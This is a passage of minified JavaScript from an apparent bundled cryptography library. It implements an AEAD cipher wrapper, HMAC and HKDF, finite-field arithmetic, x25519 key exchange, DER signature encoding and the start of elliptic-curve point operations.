                const s = e.tagLength;
                s && void 0 !== o[1] && Rh(o[1]);
                const a = t(r, ...o)
                  , c = (e, t) => {
                    if (void 0 !== t) {
                        if (2 !== e)
                            throw new Error("cipher output not supported");
                        Rh(t)
                    }
                }
                ;
                let l = !1;
                return {
                    encrypt(e, t) {
                        if (l)
                            throw new Error("cannot encrypt() twice with same key + nonce");
                        return l = !0,
                        Rh(e),
                        c(a.encrypt.length, t),
                        a.encrypt(e, t)
                    },
                    decrypt(e, t) {
                        if (Rh(e),
                        s && e.length < s)
                            throw new Error("invalid ciphertext length: smaller than tagLength=" + s);
                        return c(a.decrypt.length, t),
                        a.decrypt(e, t)
                    }
                }
            }
            return Object.assign(r, e),
            r
        }
        )({
            blockSize: 64,
            nonceLength: 12,
            tagLength: 16
        }, (cf = tf,
        (e, t, r) => ({
            encrypt(n, o) {
                const i = n.length;
                (o = Dh(i + 16, o, !1)).set(n);
                const s = o.subarray(0, -16);
                cf(e, t, s, s, 1);
                const a = sf(cf, e, t, s, r);
                return o.set(a, i),
                Nh(a),
                o
            },
            decrypt(n, o) {
                o = Dh(n.length - 16, o, !1);
                const i = n.subarray(0, -16)
                  , s = n.subarray(-16)
                  , a = sf(cf, e, t, i, r);
                if (!function(e, t) {
                    if (e.length !== t.length)
                        return !1;
                    let r = 0;
                    for (let n = 0; n < e.length; n++)
                        r |= e[n] ^ t[n];
                    return 0 === r
                }(s, a))
                    throw new Error("invalid tag");
                return o.set(n.subarray(0, -16)),
                cf(e, t, o, o, 1),
                Nh(a),
                o
            }
        })));
        var cf;
        class lf extends td {
            constructor(e, t) {
                super(),
                this.finished = !1,
                this.destroyed = !1,
                Vu(e);
                const r = ed(t);
                if (this.iHash = e.create(),
                "function" != typeof this.iHash.update)
                    throw new Error("Expected instance of class which extends utils.Hash");
                this.blockLen = this.iHash.blockLen,
                this.outputLen = this.iHash.outputLen;
                const n = this.blockLen
                  , o = new Uint8Array(n);
                o.set(r.length > n ? e.create().update(r).digest() : r);
                for (let i = 0; i < o.length; i++)
                    o[i] ^= 54;
                this.iHash.update(o),
                this.oHash = e.create();
                for (let i = 0; i < o.length; i++)
                    o[i] ^= 106;
                this.oHash.update(o),
                $u(o)
            }
            update(e) {
                return Hu(this),
                this.iHash.update(e),
                this
            }
            digestInto(e) {
                Hu(this),
                zu(e, this.outputLen),
                this.finished = !0,
                this.iHash.digestInto(e),
                this.oHash.update(e),
                this.oHash.digestInto(e),
                this.destroy()
            }
            digest() {
                const e = new Uint8Array(this.oHash.outputLen);
                return this.digestInto(e),
                e
            }
            _cloneInto(e) {
                e || (e = Object.create(Object.getPrototypeOf(this), {}));
                const {oHash: t, iHash: r, finished: n, destroyed: o, blockLen: i, outputLen: s} = this;
                return e.finished = n,
                e.destroyed = o,
                e.blockLen = i,
                e.outputLen = s,
                e.oHash = t._cloneInto(e.oHash),
                e.iHash = r._cloneInto(e.iHash),
                e
            }
            clone() {
                return this._cloneInto()
            }
            destroy() {
                this.destroyed = !0,
                this.oHash.destroy(),
                this.iHash.destroy()
            }
        }
        const uf = (e, t, r) => new lf(e,t).update(r).digest();
        uf.create = (e, t) => new lf(e,t);
        const df = Uint8Array.from([0])
          , hf = Uint8Array.of();
        const ff = (e, t, r, n, o) => function(e, t, r) {
            let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 32;
            Vu(e),
            ju(n);
            const o = e.outputLen;
            if (n > 255 * o)
                throw new Error("Length should be <= 255*HashLen");
            const i = Math.ceil(n / o);
            void 0 === r && (r = hf);
            const s = new Uint8Array(i * o)
              , a = uf.create(e, t)
              , c = a._cloneInto()
              , l = new Uint8Array(a.outputLen);
            for (let u = 0; u < i; u++)
                df[0] = u + 1,
                c.update(0 === u ? hf : l).update(r).update(df).digestInto(l),
                s.set(l, o * u),
                a._cloneInto(c);
            return a.destroy(),
            c.destroy(),
            $u(l, df),
            s.slice(0, n)
        }(e, function(e, t, r) {
            return Vu(e),
            void 0 === r && (r = new Uint8Array(e.outputLen)),
            uf(e, ed(r), ed(t))
        }(e, t, r), n, o)
          , pf = Ud
          , gf = BigInt(0)
          , yf = BigInt(1);
        function mf(e) {
            return e instanceof Uint8Array || ArrayBuffer.isView(e) && "Uint8Array" === e.constructor.name
        }
        function bf(e) {
            if (!mf(e))
                throw new Error("Uint8Array expected")
        }
        function vf(e, t) {
            if ("boolean" != typeof t)
                throw new Error(e + " boolean expected, got " + t)
        }
        function wf(e) {
            const t = e.toString(16);
            return 1 & t.length ? "0" + t : t
        }
        function Tf(e) {
            if ("string" != typeof e)
                throw new Error("hex string expected, got " + typeof e);
            return "" === e ? gf : BigInt("0x" + e)
        }
        const Af = "function" == typeof Uint8Array.from([]).toHex && "function" == typeof Uint8Array.fromHex
          , Ef = Array.from({
            length: 256
        }, ( (e, t) => t.toString(16).padStart(2, "0")));
        function Pf(e) {
            if (bf(e),
            Af)
                return e.toHex();
            let t = "";
            for (let r = 0; r < e.length; r++)
                t += Ef[e[r]];
            return t
        }
        const Cf = 48
          , Sf = 57
          , If = 65
          , Bf = 70
          , xf = 97
          , Of = 102;
        function _f(e) {
            return e >= Cf && e <= Sf ? e - Cf : e >= If && e <= Bf ? e - (If - 10) : e >= xf && e <= Of ? e - (xf - 10) : void 0
        }
        function Wf(e) {
            if ("string" != typeof e)
                throw new Error("hex string expected, got " + typeof e);
            if (Af)
                return Uint8Array.fromHex(e);
            const t = e.length
              , r = t / 2;
            if (t % 2)
                throw new Error("hex string expected, got unpadded hex of length " + t);
            const n = new Uint8Array(r);
            for (let o = 0, i = 0; o < r; o++,
            i += 2) {
                const t = _f(e.charCodeAt(i))
                  , r = _f(e.charCodeAt(i + 1));
                if (void 0 === t || void 0 === r) {
                    const t = e[i] + e[i + 1];
                    throw new Error('hex string expected, got non-hex character "' + t + '" at index ' + i)
                }
                n[o] = 16 * t + r
            }
            return n
        }
        function Rf(e) {
            return Tf(Pf(e))
        }
        function kf(e) {
            return bf(e),
            Tf(Pf(Uint8Array.from(e).reverse()))
        }
        function Mf(e, t) {
            return Wf(e.toString(16).padStart(2 * t, "0"))
        }
        function Nf(e, t) {
            return Mf(e, t).reverse()
        }
        function Ff(e, t, r) {
            let n;
            if ("string" == typeof t)
                try {
                    n = Wf(t)
                } catch (_e) {
                    throw new Error(e + " must be hex string or Uint8Array, cause: " + _e)
                }
            else {
                if (!mf(t))
                    throw new Error(e + " must be hex string or Uint8Array");
                n = Uint8Array.from(t)
            }
            const o = n.length;
            if ("number" == typeof r && o !== r)
                throw new Error(e + " of length " + r + " expected, got " + o);
            return n
        }
        function Uf() {
            let e = 0;
            for (let r = 0; r < arguments.length; r++) {
                const t = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                bf(t),
                e += t.length
            }
            const t = new Uint8Array(e);
            for (let r = 0, n = 0; r < arguments.length; r++) {
                const e = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                t.set(e, n),
                n += e.length
            }
            return t
        }
        const Df = e => "bigint" == typeof e && gf <= e;
        function Lf(e, t, r) {
            return Df(e) && Df(t) && Df(r) && t <= e && e < r
        }
        function jf(e, t, r, n) {
            if (!Lf(t, r, n))
                throw new Error("expected valid " + e + ": " + r + " <= n < " + n + ", got " + t)
        }
        const zf = e => (yf << BigInt(e)) - yf
          , Vf = e => new Uint8Array(e)
          , Hf = e => Uint8Array.from(e);
        const qf = {
            bigint: e => "bigint" == typeof e,
            function: e => "function" == typeof e,
            boolean: e => "boolean" == typeof e,
            string: e => "string" == typeof e,
            stringOrUint8Array: e => "string" == typeof e || mf(e),
            isSafeInteger: e => Number.isSafeInteger(e),
            array: e => Array.isArray(e),
            field: (e, t) => t.Fp.isValid(e),
            hash: e => "function" == typeof e && Number.isSafeInteger(e.outputLen)
        };
        function Gf(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            const n = (t, r, n) => {
                const o = qf[r];
                if ("function" != typeof o)
                    throw new Error("invalid validator function");
                const i = e[t];
                if ((!n || void 0 !== i) && !o(i, e))
                    throw new Error("param " + String(t) + " is invalid. Expected " + r + ", got " + i)
            }
            ;
            for (const [o,i] of Object.entries(t))
                n(o, i, !1);
            for (const [o,i] of Object.entries(r))
                n(o, i, !0);
            return e
        }
        function $f(e) {
            const t = new WeakMap;
            return function(r) {
                const n = t.get(r);
                if (void 0 !== n)
                    return n;
                for (var o = arguments.length, i = new Array(o > 1 ? o - 1 : 0), s = 1; s < o; s++)
                    i[s - 1] = arguments[s];
                const a = e(r, ...i);
                return t.set(r, a),
                a
            }
        }
        const Kf = BigInt(0)
          , Zf = BigInt(1)
          , Yf = BigInt(2)
          , Jf = BigInt(3)
          , Xf = BigInt(4)
          , Qf = BigInt(5)
          , ep = BigInt(8);
        function tp(e, t) {
            const r = e % t;
            return r >= Kf ? r : t + r
        }
        function rp(e, t, r) {
            let n = e;
            for (; t-- > Kf; )
                n *= n,
                n %= r;
            return n
        }
        function np(e, t) {
            if (e === Kf)
                throw new Error("invert: expected non-zero number");
            if (t <= Kf)
                throw new Error("invert: expected positive modulus, got " + t);
            let r = tp(e, t)
              , n = t
              , o = Kf
              , i = Zf;
            for (; r !== Kf; ) {
                const e = n % r
                  , t = o - i * (n / r);
                n = r,
                r = e,
                o = i,
                i = t
            }
            if (n !== Zf)
                throw new Error("invert: does not exist");
            return tp(o, t)
        }
        function op(e, t) {
            const r = (e.ORDER + Zf) / Xf
              , n = e.pow(t, r);
            if (!e.eql(e.sqr(n), t))
                throw new Error("Cannot find square root");
            return n
        }
        function ip(e, t) {
            const r = (e.ORDER - Qf) / ep
              , n = e.mul(t, Yf)
              , o = e.pow(n, r)
              , i = e.mul(t, o)
              , s = e.mul(e.mul(i, Yf), o)
              , a = e.mul(i, e.sub(s, e.ONE));
            if (!e.eql(e.sqr(a), t))
                throw new Error("Cannot find square root");
            return a
        }
        function sp(e) {
            return e % Xf === Jf ? op : e % ep === Qf ? ip : function(e) {
                if (e < BigInt(3))
                    throw new Error("sqrt is not defined for small field");
                let t = e - Zf
                  , r = 0;
                for (; t % Yf === Kf; )
                    t /= Yf,
                    r++;
                let n = Yf;
                const o = dp(e);
                for (; 1 === lp(o, n); )
                    if (n++ > 1e3)
                        throw new Error("Cannot find square root: probably non-prime P");
                if (1 === r)
                    return op;
                let i = o.pow(n, t);
                const s = (t + Zf) / Yf;
                return function(e, n) {
                    if (e.is0(n))
                        return n;
                    if (1 !== lp(e, n))
                        throw new Error("Cannot find square root");
                    let o = r
                      , a = e.mul(e.ONE, i)
                      , c = e.pow(n, t)
                      , l = e.pow(n, s);
                    for (; !e.eql(c, e.ONE); ) {
                        if (e.is0(c))
                            return e.ZERO;
                        let t = 1
                          , r = e.sqr(c);
                        for (; !e.eql(r, e.ONE); )
                            if (t++,
                            r = e.sqr(r),
                            t === o)
                                throw new Error("Cannot find square root");
                        const n = Zf << BigInt(o - t - 1)
                          , i = e.pow(a, n);
                        o = t,
                        a = e.sqr(i),
                        c = e.mul(c, a),
                        l = e.mul(l, i)
                    }
                    return l
                }
            }(e)
        }
        const ap = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
        function cp(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
            const n = new Array(t.length).fill(r ? e.ZERO : void 0)
              , o = t.reduce(( (t, r, o) => e.is0(r) ? t : (n[o] = t,
            e.mul(t, r))), e.ONE)
              , i = e.inv(o);
            return t.reduceRight(( (t, r, o) => e.is0(r) ? t : (n[o] = e.mul(t, n[o]),
            e.mul(t, r))), i),
            n
        }
        function lp(e, t) {
            const r = (e.ORDER - Zf) / Yf
              , n = e.pow(t, r)
              , o = e.eql(n, e.ONE)
              , i = e.eql(n, e.ZERO)
              , s = e.eql(n, e.neg(e.ONE));
            if (!o && !i && !s)
                throw new Error("invalid Legendre symbol result");
            return o ? 1 : i ? 0 : -1
        }
        function up(e, t) {
            void 0 !== t && ju(t);
            const r = void 0 !== t ? t : e.toString(2).length;
            return {
                nBitLength: r,
                nByteLength: Math.ceil(r / 8)
            }
        }
        function dp(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2]
              , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
            if (e <= Kf)
                throw new Error("invalid field: expected ORDER > 0, got " + e);
            const {nBitLength: o, nByteLength: i} = up(e, t);
            if (i > 2048)
                throw new Error("invalid field: expected ORDER of <= 2048 bytes");
            let s;
            const a = Object.freeze({
                ORDER: e,
                isLE: r,
                BITS: o,
                BYTES: i,
                MASK: zf(o),
                ZERO: Kf,
                ONE: Zf,
                create: t => tp(t, e),
                isValid: t => {
                    if ("bigint" != typeof t)
                        throw new Error("invalid field element: expected bigint, got " + typeof t);
                    return Kf <= t && t < e
                }
                ,
                is0: e => e === Kf,
                isOdd: e => (e & Zf) === Zf,
                neg: t => tp(-t, e),
                eql: (e, t) => e === t,
                sqr: t => tp(t * t, e),
                add: (t, r) => tp(t + r, e),
                sub: (t, r) => tp(t - r, e),
                mul: (t, r) => tp(t * r, e),
                pow: (e, t) => function(e, t, r) {
                    if (r < Kf)
                        throw new Error("invalid exponent, negatives unsupported");
                    if (r === Kf)
                        return e.ONE;
                    if (r === Zf)
                        return t;
                    let n = e.ONE
                      , o = t;
                    for (; r > Kf; )
                        r & Zf && (n = e.mul(n, o)),
                        o = e.sqr(o),
                        r >>= Zf;
                    return n
                }(a, e, t),
                div: (t, r) => tp(t * np(r, e), e),
                sqrN: e => e * e,
                addN: (e, t) => e + t,
                subN: (e, t) => e - t,
                mulN: (e, t) => e * t,
                inv: t => np(t, e),
                sqrt: n.sqrt || (t => (s || (s = sp(e)),
                s(a, t))),
                toBytes: e => r ? Nf(e, i) : Mf(e, i),
                fromBytes: e => {
                    if (e.length !== i)
                        throw new Error("Field.fromBytes: expected " + i + " bytes, got " + e.length);
                    return r ? kf(e) : Rf(e)
                }
                ,
                invertBatch: e => cp(a, e),
                cmov: (e, t, r) => r ? t : e
            });
            return Object.freeze(a)
        }
        function hp(e) {
            if ("bigint" != typeof e)
                throw new Error("field order must be bigint");
            const t = e.toString(2).length;
            return Math.ceil(t / 8)
        }
        function fp(e) {
            const t = hp(e);
            return t + Math.ceil(t / 2)
        }
        const pp = BigInt(0)
          , gp = BigInt(1);
        function yp(e, t) {
            const r = t.negate();
            return e ? r : t
        }
        function mp(e, t) {
            if (!Number.isSafeInteger(e) || e <= 0 || e > t)
                throw new Error("invalid window size, expected [1.." + t + "], got W=" + e)
        }
        function bp(e, t) {
            mp(e, t);
            const r = 2 ** e;
            return {
                windows: Math.ceil(t / e) + 1,
                windowSize: 2 ** (e - 1),
                mask: zf(e),
                maxNumber: r,
                shiftBy: BigInt(e)
            }
        }
        function vp(e, t, r) {
            const {windowSize: n, mask: o, maxNumber: i, shiftBy: s} = r;
            let a = Number(e & o)
              , c = e >> s;
            a > n && (a -= i,
            c += gp);
            const l = t * n;
            return {
                nextN: c,
                offset: l + Math.abs(a) - 1,
                isZero: 0 === a,
                isNeg: a < 0,
                isNegF: t % 2 !== 0,
                offsetF: l
            }
        }
        const wp = new WeakMap
          , Tp = new WeakMap;
        function Ap(e) {
            return Tp.get(e) || 1
        }
        function Ep(e, t, r, n) {
            (function(e, t) {
                if (!Array.isArray(e))
                    throw new Error("array expected");
                e.forEach(( (e, r) => {
                    if (!(e instanceof t))
                        throw new Error("invalid point at index " + r)
                }
                ))
            }
            )(r, e),
            function(e, t) {
                if (!Array.isArray(e))
                    throw new Error("array of scalars expected");
                e.forEach(( (e, r) => {
                    if (!t.isValid(e))
                        throw new Error("invalid scalar at index " + r)
                }
                ))
            }(n, t);
            const o = r.length
              , i = n.length;
            if (o !== i)
                throw new Error("arrays of points and scalars must have equal length");
            const s = e.ZERO
              , a = function(e) {
                let t;
                for (t = 0; e > gf; e >>= yf,
                t += 1)
                    ;
                return t
            }(BigInt(o));
            let c = 1;
            a > 12 ? c = a - 3 : a > 4 ? c = a - 2 : a > 0 && (c = 2);
            const l = zf(c)
              , u = new Array(Number(l) + 1).fill(s);
            let d = s;
            for (let h = Math.floor((t.BITS - 1) / c) * c; h >= 0; h -= c) {
                u.fill(s);
                for (let t = 0; t < i; t++) {
                    const e = n[t]
                      , o = Number(e >> BigInt(h) & l);
                    u[o] = u[o].add(r[t])
                }
                let e = s;
                for (let t = u.length - 1, r = s; t > 0; t--)
                    r = r.add(u[t]),
                    e = e.add(r);
                if (d = d.add(e),
                0 !== h)
                    for (let t = 0; t < c; t++)
                        d = d.double()
            }
            return d
        }
        function Pp(e) {
            return function(e) {
                const t = ap.reduce(( (e, t) => (e[t] = "function",
                e)), {
                    ORDER: "bigint",
                    MASK: "bigint",
                    BYTES: "isSafeInteger",
                    BITS: "isSafeInteger"
                });
                Gf(e, t)
            }(e.Fp),
            Gf(e, {
                n: "bigint",
                h: "bigint",
                Gx: "field",
                Gy: "field"
            }, {
                nBitLength: "isSafeInteger",
                nByteLength: "isSafeInteger"
            }),
            Object.freeze((0,
            k.A)((0,
            k.A)((0,
            k.A)({}, up(e.n, e.nBitLength)), e), {}, {
                p: e.Fp.ORDER
            }))
        }
        BigInt(0),
        BigInt(1),
        BigInt(2),
        BigInt(8);
        const Cp = BigInt(0)
          , Sp = BigInt(1)
          , Ip = BigInt(2);
        const Bp = BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");
        BigInt(0);
        const xp = BigInt(1)
          , Op = BigInt(2)
          , _p = BigInt(3)
          , Wp = BigInt(5);
        BigInt(8);
        const Rp = function(e) {
            const t = function(e) {
                return Gf(e, {
                    adjustScalarBytes: "function",
                    powPminus2: "function"
                }),
                Object.freeze((0,
                k.A)({}, e))
            }(e)
              , {P: r, type: n, adjustScalarBytes: o, powPminus2: i} = t
              , s = "x25519" === n;
            if (!s && "x448" !== n)
                throw new Error("invalid type");
            const a = s ? 255 : 448
              , c = s ? 32 : 56
              , l = BigInt(s ? 9 : 5)
              , u = BigInt(s ? 121665 : 39081)
              , d = s ? Ip ** BigInt(254) : Ip ** BigInt(447)
              , h = s ? BigInt(8) * Ip ** BigInt(251) - Sp : BigInt(4) * Ip ** BigInt(445) - Sp
              , f = d + h + Sp
              , p = e => tp(e, r)
              , g = y(l);
            function y(e) {
                return Nf(p(e), c)
            }
            function m(e, t) {
                const n = function(e, t) {
                    jf("u", e, Cp, r),
                    jf("scalar", t, d, f);
                    const n = t
                      , o = e;
                    let s = Sp
                      , c = Cp
                      , l = e
                      , h = Sp
                      , g = Cp;
                    for (let r = BigInt(a - 1); r >= Cp; r--) {
                        const e = n >> r & Sp;
                        g ^= e,
                        ({x_2: s, x_3: l} = v(g, s, l)),
                        ({x_2: c, x_3: h} = v(g, c, h)),
                        g = e;
                        const t = s + c
                          , i = p(t * t)
                          , a = s - c
                          , d = p(a * a)
                          , f = i - d
                          , y = l + h
                          , m = p((l - h) * t)
                          , b = p(y * a)
                          , w = m + b
                          , T = m - b;
                        l = p(w * w),
                        h = p(o * p(T * T)),
                        s = p(i * d),
                        c = p(f * (i + p(u * f)))
                    }
                    ({x_2: s, x_3: l} = v(g, s, l)),
                    ({x_2: c, x_3: h} = v(g, c, h));
                    const y = i(c);
                    return p(s * y)
                }(function(e) {
                    const t = Ff("u coordinate", e, c);
                    return s && (t[31] &= 127),
                    p(kf(t))
                }(t), function(e) {
                    return kf(o(Ff("scalar", e, c)))
                }(e));
                if (n === Cp)
                    throw new Error("invalid private or public key received");
                return y(n)
            }
            function b(e) {
                return m(e, g)
            }
            function v(e, t, r) {
                const n = p(e * (t - r));
                return {
                    x_2: t = p(t - n),
                    x_3: r = p(r + n)
                }
            }
            return {
                scalarMult: m,
                scalarMultBase: b,
                getSharedSecret: (e, t) => m(e, t),
                getPublicKey: e => b(e),
                utils: {
                    randomPrivateKey: () => t.randomBytes(c)
                },
                GuBytes: g.slice()
            }
        }({
            P: Bp,
            type: "x25519",
            powPminus2: e => {
                const t = Bp
                  , {pow_p_5_8: r, b2: n} = function(e) {
                    const t = BigInt(10)
                      , r = BigInt(20)
                      , n = BigInt(40)
                      , o = BigInt(80)
                      , i = Bp
                      , s = e * e % i * e % i
                      , a = rp(s, Op, i) * s % i
                      , c = rp(a, xp, i) * e % i
                      , l = rp(c, Wp, i) * c % i
                      , u = rp(l, t, i) * l % i
                      , d = rp(u, r, i) * u % i
                      , h = rp(d, n, i) * d % i
                      , f = rp(h, o, i) * h % i
                      , p = rp(f, o, i) * h % i
                      , g = rp(p, t, i) * l % i;
                    return {
                        pow_p_5_8: rp(g, Op, i) * e % i,
                        b2: s
                    }
                }(e);
                return tp(rp(r, _p, t) * n, t)
            }
            ,
            adjustScalarBytes: function(e) {
                return e[0] &= 248,
                e[31] &= 127,
                e[31] |= 64,
                e
            },
            randomBytes: nd
        });
        function kp(e) {
            void 0 !== e.lowS && vf("lowS", e.lowS),
            void 0 !== e.prehash && vf("prehash", e.prehash)
        }
        class Mp extends Error {
            constructor() {
                super(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "")
            }
        }
        const Np = {
            Err: Mp,
            _tlv: {
                encode: (e, t) => {
                    const {Err: r} = Np;
                    if (e < 0 || e > 256)
                        throw new r("tlv.encode: wrong tag");
                    if (1 & t.length)
                        throw new r("tlv.encode: unpadded data");
                    const n = t.length / 2
                      , o = wf(n);
                    if (o.length / 2 & 128)
                        throw new r("tlv.encode: long form length too big");
                    const i = n > 127 ? wf(o.length / 2 | 128) : "";
                    return wf(e) + i + o + t
                }
                ,
                decode(e, t) {
                    const {Err: r} = Np;
                    let n = 0;
                    if (e < 0 || e > 256)
                        throw new r("tlv.encode: wrong tag");
                    if (t.length < 2 || t[n++] !== e)
                        throw new r("tlv.decode: wrong tlv");
                    const o = t[n++];
                    let i = 0;
                    if (!!(128 & o)) {
                        const e = 127 & o;
                        if (!e)
                            throw new r("tlv.decode(long): indefinite length not supported");
                        if (e > 4)
                            throw new r("tlv.decode(long): byte length is too big");
                        const s = t.subarray(n, n + e);
                        if (s.length !== e)
                            throw new r("tlv.decode: length bytes not complete");
                        if (0 === s[0])
                            throw new r("tlv.decode(long): zero leftmost byte");
                        for (const t of s)
                            i = i << 8 | t;
                        if (n += e,
                        i < 128)
                            throw new r("tlv.decode(long): not minimal encoding")
                    } else
                        i = o;
                    const s = t.subarray(n, n + i);
                    if (s.length !== i)
                        throw new r("tlv.decode: wrong value length");
                    return {
                        v: s,
                        l: t.subarray(n + i)
                    }
                }
            },
            _int: {
                encode(e) {
                    const {Err: t} = Np;
                    if (e < Up)
                        throw new t("integer: negative integers are not allowed");
                    let r = wf(e);
                    if (8 & Number.parseInt(r[0], 16) && (r = "00" + r),
                    1 & r.length)
                        throw new t("unexpected DER parsing assertion: unpadded hex");
                    return r
                },
                decode(e) {
                    const {Err: t} = Np;
                    if (128 & e[0])
                        throw new t("invalid signature integer: negative");
                    if (0 === e[0] && !(128 & e[1]))
                        throw new t("invalid signature integer: unnecessary leading zero");
                    return Rf(e)
                }
            },
            toSig(e) {
                const {Err: t, _int: r, _tlv: n} = Np
                  , o = Ff("signature", e)
                  , {v: i, l: s} = n.decode(48, o);
                if (s.length)
                    throw new t("invalid signature: left bytes after parsing");
                const {v: a, l: c} = n.decode(2, i)
                  , {v: l, l: u} = n.decode(2, c);
                if (u.length)
                    throw new t("invalid signature: left bytes after parsing");
                return {
                    r: r.decode(a),
                    s: r.decode(l)
                }
            },
            hexFromSig(e) {
                const {_tlv: t, _int: r} = Np
                  , n = t.encode(2, r.encode(e.r)) + t.encode(2, r.encode(e.s));
                return t.encode(48, n)
            }
        };
        function Fp(e, t) {
            return Pf(Mf(e, t))
        }
        const Up = BigInt(0)
          , Dp = BigInt(1);
        BigInt(2);
        const Lp = BigInt(3)
          , jp = BigInt(4);
        function zp(e) {
            const t = function(e) {
                const t = Pp(e);
                Gf(t, {
                    a: "field",
                    b: "field"
                }, {
                    allowInfinityPoint: "boolean",
                    allowedPrivateKeyLengths: "array",
                    clearCofactor: "function",
                    fromBytes: "function",
                    isTorsionFree: "function",
                    toBytes: "function",
                    wrapPrivateKey: "boolean"
                });
                const {endo: r, Fp: n, a: o} = t;
                if (r) {
                    if (!n.eql(o, n.ZERO))
                        throw new Error("invalid endo: CURVE.a must be 0");
                    if ("object" != typeof r || "bigint" != typeof r.beta || "function" != typeof r.splitScalar)
                        throw new Error('invalid endo: expected "beta": bigint and "splitScalar": function')
                }
                return Object.freeze((0,
                k.A)({}, t))
            }(e)
              , {Fp: r} = t
              , n = dp(t.n, t.nBitLength)
              , o = t.toBytes || ( (e, t, n) => {
                const o = t.toAffine();
                return Uf(Uint8Array.from([4]), r.toBytes(o.x), r.toBytes(o.y))
            }
            )
              , i = t.fromBytes || (e => {
                const t = e.subarray(1);
                return {
                    x: r.fromBytes(t.subarray(0, r.BYTES)),
                    y: r.fromBytes(t.subarray(r.BYTES, 2 * r.BYTES))
                }
            }
            );
            function s(e) {
                const {a: n, b: o} = t
                  , i = r.sqr(e)
                  , s = r.mul(i, e);
                return r.add(r.add(s, r.mul(e, n)), o)
            }
            function a(e, t) {
                const n = r.sqr(t)
                  , o = s(e);
                return r.eql(n, o)
            }
            if (!a(t.Gx, t.Gy))
                throw new Error("bad curve params: generator point");
            const c = r.mul(r.pow(t.a, Lp), jp)
              , l = r.mul(r.sqr(t.b), BigInt(27));
            if (r.is0(r.add(c, l)))
                throw new Error("bad curve params: a or b");
            function u(e) {
                const {allowedPrivateKeyLengths: r, nByteLength: n, wrapPrivateKey: o, n: i} = t;
                if (r && "bigint" != typeof e) {
                    if (mf(e) && (e = Pf(e)),
                    "string" != typeof e || !r.includes(e.length))
                        throw new Error("invalid private key");
                    e = e.padStart(2 * n, "0")
                }
                let s;
                try {
                    s = "bigint" == typeof e ? e : Rf(Ff("private key", e, n))
                } catch (a) {
                    throw new Error("invalid private key, expected hex or " + n + " bytes, got " + typeof e)
                }
                return o && (s = tp(s, i)),
                jf("private key", s, Dp, i),
                s
            }
            function d(e) {
                if (!(e instanceof p))
                    throw new Error("ProjectivePoint expected")
            }
            const h = $f(( (e, t) => {
                const {px: n, py: o, pz: i} = e;
                if (r.eql(i, r.ONE))
                    return {
                        x: n,
                        y: o
                    };
                const s = e.is0();
                null == t && (t = s ? r.ONE : r.inv(i));
                const a = r.mul(n, t)
                  , c = r.mul(o, t)
                  , l = r.mul(i, t);
                if (s)
                    return {
                        x: r.ZERO,
                        y: r.ZERO
                    };
                if (!r.eql(l, r.ONE))
                    throw new Error("invZ was invalid");
                return {
                    x: a,
                    y: c
                }
            }
            ))
              , f = $f((e => {
                if (e.is0()) {
                    if (t.allowInfinityPoint && !r.is0(e.py))
                        return;
                    throw new Error("bad point: ZERO")
                }
                const {x: n, y: o} = e.toAffine();
                if (!r.isValid(n) || !r.isValid(o))
                    throw new Error("bad point: x or y not FE");
                if (!a(n, o))
                    throw new Error("bad point: equation left != right");
                if (!e.isTorsionFree())
                    throw new Error("bad point: not in prime-order subgroup");
                return !0
            }
            ));
            class p {
                constructor(e, t, n) {
                    if (null == e || !r.isValid(e))
                        throw new Error("x required");
                    if (null == t || !r.isValid(t) || r.is0(t))
                        throw new Error("y required");
                    if (null == n || !r.isValid(n))
                        throw new Error("z required");
                    this.px = e,
                    this.py = t,
                    this.pz = n,
                    Object.freeze(this)
                }
                static fromAffine(e) {
                    const {x: t, y: n} = e || {};
                    if (!e || !r.isValid(t) || !r.isValid(n))
                        throw new Error("invalid affine point");
                    if (e instanceof p)
                        throw new Error("projective point not allowed");
                    const o = e => r.eql(e, r.ZERO);
                    return o(t) && o(n) ? p.ZERO : new p(t,n,r.ONE)
                }
                get x() {
                    return this.toAffine().x
                }
                get y() {
                    return this.toAffine().y
                }
                static normalizeZ(e) {
                    const t = cp(r, e.map((e => e.pz)));
                    return e.map(( (e, r) => e.toAffine(t[r]))).map(p.fromAffine)
                }
                static fromHex(e) {
                    const t = p.fromAffine(i(Ff("pointHex", e)));
                    return t.assertValidity(),
                    t
                }
                static fromPrivateKey(e) {
                    return p.BASE.multiply(u(e))
                }
                static msm(e, t) {
                    return Ep(p, n, e, t)
                }
                _setWindowSize(e) {
                    m.setWindowSize(this, e)
                }
                assertValidity() {
                    f(this)
                }
                hasEvenY() {
                    const {y: e} = this.toAffine();
                    if (r.isOdd)
                        return !r.isOdd(e);
                    throw new Error("Field doesn't support isOdd")
                }
                equals(e) {
                    d(e);
                    const {px: t, py: n, pz: o} = this
                      , {px: i, py: s, pz: a} = e
                      , c = r.eql(r.mul(t, a), r.mul(i, o))
                      , l = r.eql(r.mul(n, a), r.mul(s, o));
                    return c && l
                }
                negate() {
                    return new p(this.px,r.neg(this.py),this.pz)
                }
                double() {
                    const {a: e, b: n} = t
                      , o = r.mul(n, Lp)
                      , {px: i, py: s, pz: a} = this;
                    let c = r.ZERO
                      , l = r.ZERO
                      , u = r.ZERO
                      , d = r.mul(i, i)
                      , h = r.mul(s, s)
                      , f = r.mul(a, a)
                      , g = r.mul(i, s);
                    return g = r.add(g, g),
                    u = r.mul(i, a),
                    u = r.add(u, u),
                    c = r.mul(e, u),
                    l = r.mul(o, f),
                    l = r.add(c, l),
                    c = r.sub(h, l),
                    l = r.add(h, l),
                    l = r.mul(c, l),
                    c = r.mul(g, c),
                    u = r.mul(o, u),
                    f = r.mul(e, f),
                    g = r.sub(d, f),
                    g = r.mul(e, g),
                    g = r.add(g, u),
                    u = r.add(d, d),
                    d = r.add(u, d),
                    d = r.add(d, f),
                    d = r.mul(d, g),
                    l = r.add(l, d),
                    f = r.mul(s, a),
                    f = r.add(f, f),
                    d = r.mul(f, g),
                    c = r.sub(c, d),
